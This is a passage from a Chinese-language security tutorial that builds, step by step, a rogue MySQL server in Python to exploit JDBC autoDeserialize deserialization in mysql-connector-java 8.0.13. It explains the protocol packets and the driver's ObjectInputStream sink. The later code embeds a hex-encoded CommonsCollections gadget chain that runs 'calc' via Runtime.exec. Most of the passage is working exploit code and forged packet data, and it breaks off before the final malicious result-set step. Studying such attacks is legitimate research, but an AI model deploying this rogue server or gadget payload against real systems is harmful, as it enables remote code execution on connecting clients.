class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;向目标JDBC发送数据 : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">        <span class="keyword">raise</span> ConnectionResetError()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()  </span><br><span class="line"><span class="comment">#程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#设置端口</span></span><br><span class="line">    host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    port=<span class="number">3309</span></span><br><span class="line">    <span class="comment">#开启一个socket接受JDBC的连接</span></span><br><span class="line">    sql_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#绑定ip</span></span><br><span class="line">    sql_server.bind((host, port))</span><br><span class="line">    <span class="comment">#将socket设置为被动监听模式，并且一次只能接受一个连接</span></span><br><span class="line">    sql_server.listen(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;恶意mysql已在<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>开启&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#conn为连接句柄,addr为接受请求的源地址</span></span><br><span class="line">        conn, addr = sql_server.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;接受到来自&#123;&#125;:&#123;&#125;的连接请求&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">        <span class="comment">#发送greeting包</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">                <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;over&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;接受到的data:&quot;</span>,data)</span><br><span class="line">            <span class="comment">#收到Login包</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;password&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn,response_ok_data)</span><br><span class="line">            .....</span><br></pre></td></tr></table></figure>

<h3 id="Info-Request-Query"><a href="#Info-Request-Query" class="headerlink" title="Info:Request Query"></a>Info:Request Query</h3><p>&#x2F;* mysql-connector-java-8.0.13 (Revision: 66459e9d39c8fd09767992bc592acd2053279be6) *&#x2F;SELECT  @@session.auto_increment_increment AS auto_increment_increment, @@character_set_client AS character_set_client, @@character_set_connection AS character_set_connection, @@character_set_results AS character_set_results, @@character_set_server AS character_set_server, @@collation_server AS collation_server, @@collation_connection AS collation_connection, @@init_connect AS init_connect, @@interactive_timeout AS interactive_timeout, @@license AS license, @@lower_case_table_names AS lower_case_table_names, @@max_allowed_packet AS max_allowed_packet, @@net_write_timeout AS net_write_timeout, @@sql_mode AS sql_mode, @@system_time_zone AS system_time_zone, @@time_zone AS time_zone, @@transaction_isolation AS transaction_isolation, @@wait_timeout AS wait_timeout</p>
<blockquote>
<p>这个Request Query数据包是JDBC发送给MySQL服务器的查询请求，其中包含了一条极长的SQL查询。这条查询主要用于获取MySQL会话设置的一些参数值。这些参数值对于JDBC与数据库服务器之间的连接和通信非常重要，因为它们可以确保客户端与服务器之间的数据交互和处理行为一致。比如字符集,最大数据包大小等</p>
</blockquote>
<p>我们可以通过捕捉一些内容特征来确定对应的需要回复的数据内容,比如<strong>session.auto_increment_increment</strong></p>
<h3 id="Info-Response-TABULAR-Response-OK"><a href="#Info-Response-TABULAR-Response-OK" class="headerlink" title="Info:Response TABULAR Response  OK"></a>Info:Response TABULAR Response  OK</h3><p>以表格形式回复上个SQL查询的结果，需要细说</p>
<p>首先浏览一下这个mysql包中有哪些部分</p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20230421_1.png"></p>
<blockquote>
<ol>
<li>MySQL Protocol - column count: 这个数据包表示查询结果集中的列数。它告诉JDBC驱动程序有多少个字段将被返回。这是结果集元数据的第一部分。</li>
<li>MySQL Protocol - field packet: 这个数据包包含了每个字段的详细信息，例如字段名、数据类型等。这些数据包会为结果集中的每一列发送一个。这些数据包构成了结果集元数据的其余部分。</li>
<li>MySQL Protocol - row packet: 这个数据包包含了查询结果集中的实际数据。每个row packet包含了一个结果集中的一行数据。服务器将按顺序发送查询结果集中的所有行。这些数据包包含了实际查询结果的数据。</li>
<li>MySQL Protocol - response OK: 这个数据包表示查询结果集已经全部发送完毕。当JDBC驱动程序收到这个数据包时，它会知道已经接收到了所有的查询结果数据。</li>
</ol>
<p>通过这些数据包，JDBC驱动程序可以从MySQL服务器接收查询结果数据。驱动程序首先解析列数和字段信息，然后解析行数据，最后收到response OK数据包，表示结果集传输完成。这些数据包使得JDBC驱动程序能够将查询结果数据组织成一个可供应用程序使用的结果集。</p>
</blockquote>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20230422_1.png"></p>
<p>column count中的Number of fields为18 ， 说明mysql回复的结果集有18列，相应的接下来就有18个列的元数据包,我们所说的元数据也就是关于每一<strong>列</strong>的信息(field packet)</p>
<p><strong>重点关注MySQL Protocol - field packet:</strong></p>
<blockquote>
<ol>
<li>Catalog: 目录名称，通常是”def”，表示默认的目录。</li>
<li>Database: 数据库名称，即查询结果集所在的数据库。</li>
<li>Table: 表名，即查询结果集对应的表。</li>
<li>Original table: 原始表名，如果查询结果集对应的表是别名，则该字段包含实际的表名。</li>
<li>Name: 字段名，即查询结果集中列的名称。</li>
<li>Original name: 原始字段名，如果查询结果集中的字段是别名，则该字段包含实际的字段名。</li>
<li>Charset number: 字符集编号，表示该字段数据的字符集。这对于处理文本数据类型的字段（如VARCHAR、TEXT等）非常重要。</li>
<li>Length: 字段长度，表示该字段的最大长度。对于数值类型，这表示最大显示宽度。</li>
<li>Type: 字段类型，表示该字段的数据类型（如INT、VARCHAR、DATE等）。</li>
<li>Flags: 标志位，用于表示字段的一些特性，如是否为主键、是否允许NULL值等。</li>
<li>Decimals: 小数点后的位数，仅适用于浮点数和小数类型的字段。对于整数类型的字段，该值为0。</li>
</ol>
<p>Field packet中的这些信息有助于JDBC驱动程序了解查询结果集中每个字段的属性，从而可以正确地处理和转换结果集中的数据。</p>
</blockquote>
<p>这里有一点是需要我们在进行利用JDBC反序列化漏洞时特别注意的，就是Type: 字段类型需要构造为Blob</p>
<blockquote>
<p> 在field packet中，BLOB类型的值为0xFC、0xFD、0xFE或0xFF，具体取决于BLOB的大小（TINYBLOB、BLOB、MEDIUMBLOB或LONGBLOB</p>
</blockquote>
<p>具体原因看代码:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mysql.cj.jdbc.result;</span><br><span class="line"><span class="comment">//ResultSetImpl.class</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="type">int</span> columnIndex)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.checkRowPos();</span><br><span class="line">            <span class="built_in">this</span>.checkColumnBounds(columnIndex);</span><br><span class="line">            <span class="type">int</span> <span class="variable">columnIndexMinusOne</span> <span class="operator">=</span> columnIndex - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.thisRow.getNull(columnIndexMinusOne)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="built_in">this</span>.columnDefinition.getFields()[columnIndexMinusOne];</span><br><span class="line">                <span class="keyword">switch</span> (field.getMysqlType()) &#123;</span><br><span class="line">                    <span class="keyword">case</span> BIT:</span><br><span class="line">                        <span class="keyword">if</span> (!field.isBinary() &amp;&amp; !field.isBlob()) &#123;</span><br><span class="line">                            <span class="keyword">return</span> field.isSingleBit() ? <span class="built_in">this</span>.getBoolean(columnIndex) : <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="type">byte</span>[] data = <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">                            <span class="keyword">if</span> (!									(Boolean)<span class="built_in">this</span>.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) &#123;</span><br><span class="line">                                <span class="keyword">return</span> data;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> data;</span><br><span class="line">                                <span class="keyword">if</span> (data != <span class="literal">null</span> &amp;&amp; data.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (data[<span class="number">0</span>] != -<span class="number">84</span> || data[<span class="number">1</span>] != -<span class="number">19</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> <span class="built_in">this</span>.getString(columnIndex);</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">try</span> &#123;</span><br><span class="line">                                        <span class="type">ByteArrayInputStream</span> <span class="variable">bytesIn</span> <span class="operator">=</span> <span class="keyword">new</span> 												<span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">                                        <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> 													<span class="title class_">ObjectInputStream</span>(bytesIn);</span><br><span class="line">                                        obj = objIn.readObject();</span><br><span class="line">                                        objIn.close();</span><br><span class="line">                                        bytesIn.close()</span><br></pre></td></tr></table></figure>

<p><strong>但其实，只有在发送SHOW SESSION STATUS的查询结果时才需要改类型，因为我们的反序列化点在SHOW SESSION STATUS的结果集中</strong></p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20230422_2.png"></p>
<p>所以,这个语句的回复包我们照样copy就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#greeting包的伪造数据</span></span><br><span class="line">greeting_data=<span class="string">&#x27;4a0000000a382e302e313200170000000a170d656e32064600ffffc00200ffc31500000000000000000000605a28686d63690805351259006d7973716c5f6e61746976655f70617373776f726400&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Response Ok包的伪造数据</span></span><br><span class="line">response_ok_data=<span class="string">&#x27;0700000200000002000000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;向目标JDBC发送数据 : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"><span class="comment">#程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#设置端口</span></span><br><span class="line">    host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    port=<span class="number">3309</span></span><br><span class="line">    <span class="comment">#开启一个socket接受JDBC的连接</span></span><br><span class="line">    sql_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#绑定ip</span></span><br><span class="line">    sql_server.bind((host, port))</span><br><span class="line">    <span class="comment">#将socket设置为被动监听模式，并且一次只能接受一个连接</span></span><br><span class="line">    sql_server.listen(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;恶意mysql已在<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>开启&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#conn为连接句柄,addr为接受请求的源地址</span></span><br><span class="line">        conn, addr = sql_server.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;接受到来自&#123;&#125;:&#123;&#125;的连接请求&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">        <span class="comment">#发送greeting包</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment">#接受Login Request包后发送Response OK包</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line">            <span class="comment">#接收后续数据包</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                                    reply_data=<span class="string">&quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span></span><br><span class="line">                    ......</span><br></pre></td></tr></table></figure>



<h3 id="Info-Request-Query-1"><a href="#Info-Request-Query-1" class="headerlink" title="Info: Request Query"></a>Info: Request Query</h3><p>紧接着JDBC连续发送几条SET命令语句,我们按着正常的ResponseOK回复就行</p>
<p>更新代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#greeting包的伪造数据</span></span><br><span class="line">greeting_data=<span class="string">&#x27;4a0000000a382e302e313200170000000a170d656e32064600ffffc00200ffc31500000000000000000000605a28686d63690805351259006d7973716c5f6e61746976655f70617373776f726400&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Response Ok包的伪造数据</span></span><br><span class="line">response_ok_data=<span class="string">&#x27;0700000200000002000000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;向目标JDBC发送数据 : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">        <span class="keyword">raise</span> ConnectionResetError(<span class="string">&quot;\n通信结束\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"><span class="comment">#程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#设置端口</span></span><br><span class="line">    host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    port=<span class="number">3309</span></span><br><span class="line">    <span class="comment">#开启一个socket接受JDBC的连接</span></span><br><span class="line">    sql_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#一旦断开连接就立马重置端口，这样不用每次等待一段时间才能重新使用该端口</span></span><br><span class="line">    sql_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#绑定ip</span></span><br><span class="line">    sql_server.bind((host, port))</span><br><span class="line">    <span class="comment">#将socket设置为被动监听模式，并且一次只能接受一个连接</span></span><br><span class="line">    sql_server.listen(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;恶意mysql已在<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>开启&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#conn为连接句柄,addr为接受请求的源地址</span></span><br><span class="line">        conn, addr = sql_server.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;接受到来自&#123;&#125;:&#123;&#125;的连接请求&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">        <span class="comment">#发送greeting包</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;over&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;接受到的data:&quot;</span>,data)</span><br><span class="line">            <span class="comment">#收到Login包</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;password&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn,response_ok_data)</span><br><span class="line">            <span class="comment">#收到Request Query包，其中包含session.auto_increment_increment</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                reply_data=<span class="string">&quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span></span><br><span class="line">                send_data(conn,reply_data)</span><br><span class="line">            <span class="comment">#收到Request Query包，其中包含SET</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;set&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn,response_ok_data)</span><br><span class="line">                ......</span><br></pre></td></tr></table></figure>

<h3 id="Info-Request-Query-SELECT-session-autocommit"><a href="#Info-Request-Query-SELECT-session-autocommit" class="headerlink" title="Info: Request Query(SELECT @@session.autocommit)"></a>Info: Request Query(SELECT @@session.autocommit)</h3><blockquote>
<p><code>SELECT @@session.autocommit</code> 是一个查询语句，用于获取当前MySQL会话中的autocommit设置。autocommit是一个设置，决定在执行MySQL语句时是否自动提交事务。</p>
<p>当autocommit设置为1（true）时，每个单独的语句都会在执行后立即提交。这意味着更改将立即生效，无需使用<code>COMMIT</code>语句来显式提交事务。</p>
<p>当autocommit设置为0（false）时，您需要在执行更改后显式地使用<code>COMMIT</code>语句来提交事务。这允许您在同一个事务中执行多个更改，只有在执行<code>COMMIT</code>语句后，所有更改才会生效。</p>
<p>JDBC客户端发送<code>SELECT @@session.autocommit</code>查询可能是为了检查当前MySQL会话的autocommit设置。这有助于客户端了解事务处理方式，以便根据需要调整其操作</p>
</blockquote>
